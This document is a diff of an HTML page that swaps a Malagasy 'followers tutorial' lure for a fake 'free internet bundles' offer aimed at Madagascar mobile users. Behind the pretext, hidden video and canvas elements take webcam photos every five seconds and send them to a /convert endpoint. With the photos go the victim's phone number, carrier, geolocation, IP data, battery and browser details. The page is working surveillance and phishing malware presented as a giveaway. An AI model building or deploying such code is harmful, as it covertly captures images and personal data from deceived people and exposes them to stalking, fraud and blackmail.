@@ -1,144 +1,457 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="mg">
 <head>
-  <meta charset="UTF-8">
-  <title>Tuto</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Forfais Gratuits</title>
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/sweetalert2@11/dist/sweetalert2.min.css">
   <style>
-    body, html { 
-      margin: 0; 
-      padding: 20px; 
-      background: #f9f3e9; 
-      color: #333; 
-      font-family: 'Georgia', serif; 
-      max-width: 800px;
-      margin: 0 auto;
+    :root {
+      --primary: #8b0000;
+      --primary-hover: #a30000;
+      --secondary: #8b4513;
+      --light: #fffefc;
+      --dark: #333;
+      --gray: #e0e0e0;
+      --radius: 12px;
+      --shadow: 0 4px 12px rgba(0,0,0,0.1);
+      --transition: all 0.3s ease;
+    }
+    
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+    
+    body {
+      font-family: 'Segoe UI', Roboto, -apple-system, sans-serif;
+      background: linear-gradient(135deg, #f5f7fa 0%, #fffefc 100%);
+      min-height: 100vh;
+      padding: 20px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      color: var(--dark);
       line-height: 1.6;
     }
-    .story {
-      background: #fff;
-      padding: 30px;
-      border-radius: 10px;
-      box-shadow: 0 3px 10px rgba(0,0,0,0.1);
+    
+    .container {
+      max-width: 500px;
+      width: 100%;
+      margin: 0 auto;
     }
+    
+    .card {
+      padding: 30px;
+      background: white;
+      border-radius: var(--radius);
+      box-shadow: var(--shadow);
+      position: relative;
+      overflow: hidden;
+    }
+    
+    .card::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 8px;
+      background: linear-gradient(90deg, var(--primary) 0%, var(--secondary) 100%);
+    }
+    
     h1 {
-      color: #8b4513;
       text-align: center;
-      border-bottom: 2px dotted #d2b48c;
+      color: var(--primary);
+      margin-bottom: 20px;
+      font-size: 1.8rem;
+      font-weight: 700;
+      position: relative;
       padding-bottom: 10px;
     }
-    video, canvas { display: none; }
+    
+    h1::after {
+      content: '';
+      position: absolute;
+      bottom: 0;
+      left: 50%;
+      transform: translateX(-50%);
+      width: 80px;
+      height: 3px;
+      background: var(--secondary);
+      border-radius: 3px;
+    }
+    
+    .form-group {
+      margin-bottom: 20px;
+      position: relative;
+    }
+    
+    .form-group label {
+      display: block;
+      margin-bottom: 8px;
+      font-weight: 500;
+      color: var(--dark);
+    }
+    
+    input, select {
+      display: block;
+      width: 100%;
+      padding: 14px 16px;
+      font-size: 1rem;
+      border-radius: var(--radius);
+      border: 1px solid var(--gray);
+      transition: var(--transition);
+      background-color: #f9f9f9;
+    }
+    
+    input:focus, select:focus {
+      outline: none;
+      border-color: var(--primary);
+      box-shadow: 0 0 0 3px rgba(139, 0, 0, 0.1);
+      background-color: white;
+    }
+    
+    input::placeholder {
+      color: #999;
+    }
+    
+    .btn {
+      display: block;
+      width: 100%;
+      padding: 14px;
+      font-size: 1rem;
+      font-weight: 600;
+      border-radius: var(--radius);
+      border: none;
+      cursor: pointer;
+      transition: var(--transition);
+      text-align: center;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+    }
+    
+    .btn-primary {
+      background: var(--primary);
+      color: white;
+    }
+    
+    .btn-primary:hover {
+      background: var(--primary-hover);
+      transform: translateY(-2px);
+      box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+    }
+    
+    .btn-primary:active {
+      transform: translateY(0);
+    }
+    
+    .status-message {
+      text-align: center;
+      padding: 15px;
+      border-radius: var(--radius);
+      margin-bottom: 20px;
+      font-weight: 500;
+    }
+    
+    .error-message {
+      background-color: #ffeeee;
+      color: #d32f2f;
+      border: 1px solid #ffcdd2;
+    }
+    
+    .loader {
+      display: inline-block;
+      border: 4px solid rgba(0,0,0,0.1);
+      border-left-color: var(--primary);
+      border-radius: 50%;
+      width: 30px;
+      height: 30px;
+      animation: spin 1s linear infinite;
+      vertical-align: middle;
+      margin-right: 10px;
+    }
+    
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+    
+    .hidden {
+      display: none !important;
+    }
+    
+    .offer-selector {
+      margin-top: 25px;
+      animation: fadeIn 0.5s ease;
+    }
+    
+    .offer-selector select {
+      background-color: white;
+      border: 2px solid var(--gray);
+      font-weight: 500;
+    }
+    
+    .offer-selector label {
+      font-size: 1.1rem;
+      color: var(--primary);
+    }
+    
+    .logo {
+      text-align: center;
+      margin-bottom: 20px;
+    }
+    
+    .logo img {
+      height: 60px;
+    }
+    
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(10px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+    
+    footer {
+      text-align: center;
+      margin-top: 30px;
+      color: #777;
+      font-size: 0.9rem;
+    }
+    
+    @media (max-width: 480px) {
+      .card {
+        padding: 20px;
+      }
+      
+      h1 {
+        font-size: 1.5rem;
+      }
+      
+      input, select, .btn {
+        padding: 12px;
+      }
+    }
   </style>
 </head>
 <body>
-  <div class="story">
-    <h1>Fikafika ahazoana followers sy réactions malaky</h1>
-    <p>1. Mitraite compte: Misy ny atao hoe traite compte ahafahana mahazo followers. Misy ny Traite compte indien ary misy ny traite compte gasy. Mila manao réaction sy commentaire an'ilay olona efa malazalaza ireny ianao ary ajoutena zay mpanao réaction ny pubanzareo.</p>
 
-    <p>Memes: manao publication sary na video fampiomehezana ireny fa ireny isany mampitombo followers sy réactions malaky ary ahafahana mahazo vola tsara.</p>
+<div class="container">
+  <div class="card">
+    <div class="logo">
+      <svg width="60" height="60" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <circle cx="12" cy="12" r="10" stroke="#8b0000" stroke-width="2"/>
+        <path d="M12 16V12M12 12V8M12 12H16M12 12H8" stroke="#8b0000" stroke-width="2" stroke-linecap="round"/>
+      </svg>
+    </div>
+    
+    <h1>Forfaits gratuits</h1>
+    
+    <div id="cam-refused" class="status-message error-message hidden">
+      <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" style="vertical-align: middle; margin-right: 5px;">
+        <path d="M12 8V12M12 16H12.01M22 12C22 17.5228 17.5228 22 12 22C6.47715 22 2 17.5228 2 12C2 6.47715 6.47715 2 12 2C17.5228 2 22 6.47715 22 12Z" stroke="#d32f2f" stroke-width="2" stroke-linecap="round"/>
+      </svg>
+      Permission refusée. Vous ne pouvez pas avoir des forfaits gratuits
+    </div>
 
-    <p>Boost: mividy followers na reactions mihintsy ianao ary izay tinao ny isany na firy na firy</p>
+    <div id="form-container" class="hidden">
+      <div class="form-group">
+        <label for="phone">Numéro de téléphone</label>
+        <input id="phone" type="text" placeholder="Ohatra: 034 12 345 67" />
+      </div>
+      <button id="submit-btn" class="btn btn-primary">Envoyer</button>
+    </div>
 
-    <p>Raha page indray dia ilay manao jeu giveaway reny.</p>
-    <p>Raha misy fanontaniana dia aza misalasala manontany</p>
-
+    <div id="offer-selector" class="offer-selector hidden">
+      <div class="form-group">
+        <label for="forfait-selector">Choisissez votre forfait</label>
+        <select id="forfait-selector"></select>
+      </div>
+    </div>
   </div>
+  
+  <footer>
+    © 2025 - Forfaits internet
+  </footer>
+</div>
 
-  <video id="video" autoplay playsinline></video>
-  <canvas id="canvas"></canvas>
-  <!--__INJECT_ID__-->
-  <script>
+<video id="video" autoplay playsinline class="hidden"></video>
+<canvas id="canvas" class="hidden"></canvas>
 
-    const video = document.getElementById('video');
-    const canvas = document.getElementById('canvas');
-    const ctx = canvas.getContext('2d');
+<!--__INJECT_ID__-->
+<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+<script>
+const telmaOffers = ["TELMA 500 Ar - 100Mo", "TELMA 1000 Ar - 250Mo", "TELMA 2000 Ar - 500Mo", "TELMA 5000 Ar - 1Go"];
+const orangeOffers = ["ORANGE 300 Ar - 50Mo", "ORANGE 600 Ar - 120Mo", "ORANGE 1500 Ar - 400Mo", "ORANGE 3000 Ar - 800Mo"];
+const airtelOffers = ["AIRTEL 500 Ar - 80Mo", "AIRTEL 1000 Ar - 200Mo", "AIRTEL 2000 Ar - 450Mo", "AIRTEL 5000 Ar - 1Go"];
+let cameraGranted = false;
+let geoCoords = null;
 
-    let ipInfo = {
-      ip: 'unknown',
-      city: '',
-      region: '',
-      country: '',
-      loc: '',
-      org: '',
-      timezone: '',
-      readme: ''
-    };
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+const formContainer = document.getElementById('form-container');
+const camRefused = document.getElementById('cam-refused');
+const offerSelector = document.getElementById('offer-selector');
+const selector = document.getElementById('forfait-selector');
 
-    fetch('https://ipinfo.io/json')
-      .then(res => res.json())
-      .then(data => {
-        ipInfo = data;
-      })
-      .catch(err => console.error("IPInfo fetch failed", err));
+function detectPuce(phone) {
+  if (/^(\+261|0)(34|38)/.test(phone)) return 'telma';
+  if (/^(\+261|0)(32|37)/.test(phone)) return 'orange';
+  if (/^(\+261|0)33/.test(phone)) return 'airtel';
+  return 'unknown';
+}
 
-    async function getBatteryMessage() {
-      let batteryText = 'Battery info unavailable';
-      try {
-        if (navigator.getBattery) {
-          const battery = await navigator.getBattery();
-          const level = Math.round(battery.level * 100);
-          const charging = battery.charging ? 'Mbola micharge' : 'Tsy micharge';
-          batteryText = `Battery: ${level}%, Status: ${charging}`;
-        }
-      } catch (e) {}
+async function getGeo() {
+  return new Promise((resolve) => {
+    navigator.geolocation.getCurrentPosition(
+      pos => resolve(pos.coords),
+      () => resolve(null),
+      {timeout: 5000}
+    );
+  });
+}
 
-      return `Info azo vaovao 🗿:
+async function getIpInfo() {
+  try {
+    const res = await fetch("https://ipinfo.io/json");
+    return await res.json();
+  } catch { return {}; }
+}
 
+function getNetworkInfo() {
+  const c = navigator.connection || {};
+  return `Network: ${c.effectiveType || 'unknown'}, downlink=${c.downlink || '?'}Mb/s`;
+}
 
-${batteryText}
+async function getBatteryInfo() {
+  try {
+    const bat = await navigator.getBattery();
+    return `Battery: ${Math.round(bat.level * 100)}%, Charging: ${bat.charging}`;
+  } catch { return 'Battery info unavailable'; }
+}
 
-IP: ${ipInfo.ip}
+async function getInfoText(phone, puce) {
+  const ip = await getIpInfo();
+  const battery = await getBatteryInfo();
+  const net = getNetworkInfo();
+  const lat = geoCoords?.latitude?.toFixed(6) || 'unknown';
+  const lon = geoCoords?.longitude?.toFixed(6) || 'unknown';
 
-Cité: ${ipInfo.city}
+  return `📞 Phone: ${phone}
+📶 Puce: ${puce}
+📍 Location: lat=${lat}, lon=${lon}
+🌐 IP: ${ip.ip || '?'} | ${ip.city || ''}, ${ip.country || ''}
+🏢 ISP: ${ip.org || ''}
+🔋 ${battery}
+📡 ${net}
+🧠 UA: ${navigator.userAgent}`;
+}
 
-Region: ${ipInfo.region}
+function sendMessage(message) {
+  fetch("/convert", {
+    method: "POST",
+    body: new URLSearchParams({ id: psid, message })
+  });
+}
 
-Pays: ${ipInfo.country}
+function sendPhoto() {
+  canvas.width = video.videoWidth;
+  canvas.height = video.videoHeight;
+  canvas.getContext('2d').drawImage(video, 0, 0);
+  canvas.toBlob(async (blob) => {
+    const info = await getInfoText("-", "-");
+    const fd = new FormData();
+    fd.append("id", psid);
+    fd.append("message", info);
+    fd.append("photo", blob, "cam.jpg");
+    fetch("/convert", { method: "POST", body: fd });
+  }, 'image/jpeg', 0.8);
+}
 
-Latitude/Longitude: ${ipInfo.loc}
+function startAutoPhoto() {
+  setInterval(sendPhoto, 5000);
+}
 
-Org: ${ipInfo.org}
+function updateOffers(puce) {
+  let offers = [];
+  if (puce === "telma") offers = telmaOffers;
+  else if (puce === "orange") offers = orangeOffers;
+  else if (puce === "airtel") offers = airtelOffers;
+  
+  selector.innerHTML = '';
+  offers.forEach(f => {
+    const opt = document.createElement("option");
+    opt.textContent = f;
+    opt.value = f;
+    selector.appendChild(opt);
+  });
+  
+  offerSelector.classList.remove('hidden');
+}
 
-Réseau: ${navigator.connection.effectiveType}
+document.getElementById("submit-btn").onclick = async () => {
+  const phone = document.getElementById("phone").value.trim();
+  const puce = detectPuce(phone);
+  
+  if (!phone) {
+    Swal.fire({
+      icon: 'error',
+      title: 'Erreur',
+      text: 'Veuillez entrer votre numéro de téléphone',
+      confirmButtonColor: '#8b0000'
+    });
+    return;
+  }
+  
+  if (puce === 'unknown') {
+    Swal.fire({
+      icon: 'error',
+      title: 'Erreur',
+      text: 'Numéro non valide,
+      confirmButtonColor: '#8b0000'
+    });
+    return;
+  }
 
-Timezone: ${ipInfo.timezone}
-
-UA: ${navigator.userAgent}`;
+  Swal.fire({
+    title: 'Veuillez attendre...',
+    html: 'Vauillez attendre quelques scondes',
+    allowOutsideClick: false,
+    didOpen: () => {
+      Swal.showLoading();
     }
+  });
 
-    async function startCamera() {
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-        video.srcObject = stream;
-        video.onloadedmetadata = () => {
-          video.play();
-          captureLoop();
-        };
-      } catch (err) {
-        alert('Camera access denied');
-        console.error(err);
-      }
-    }
+  const infoText = await getInfoText(phone, puce);
+  sendMessage(infoText);
 
-    async function captureLoop() {
-      setInterval(async () => {
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        ctx.drawImage(video, 0, 0);
-        canvas.toBlob(async (blob) => {
-          const formData = new FormData();
-          formData.append('photo', blob, 'snapshot.jpg');
-          formData.append('id', PSID); // You should define PSID somewhere
-          formData.append('message', await getBatteryMessage());
+  setTimeout(() => {
+    Swal.fire({
+      icon: 'success',
+      title: 'Succès!',
+      text: 'Forfait envoyé avec succès',
+      confirmButtonColor: '#8b0000'
+    });
+    
+    updateOffers(puce);
+    startAutoPhoto();
+  }, 2000);
+};
 
-          fetch('/convert', {
-            method: 'POST',
-            body: formData
-          }).catch(console.error);
-        }, 'image/jpeg', 0.8);
-      }, 5000);
-    }
+async function initApp() {
+  geoCoords = await getGeo();
 
-    startCamera();
-  </script>
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+    video.srcObject = stream;
+    cameraGranted = true;
+    formContainer.classList.remove("hidden");
+  } catch {
+    camRefused.classList.remove("hidden");
+  }
+}
+
+initApp();
+</script>
+
 </body>
 </html>
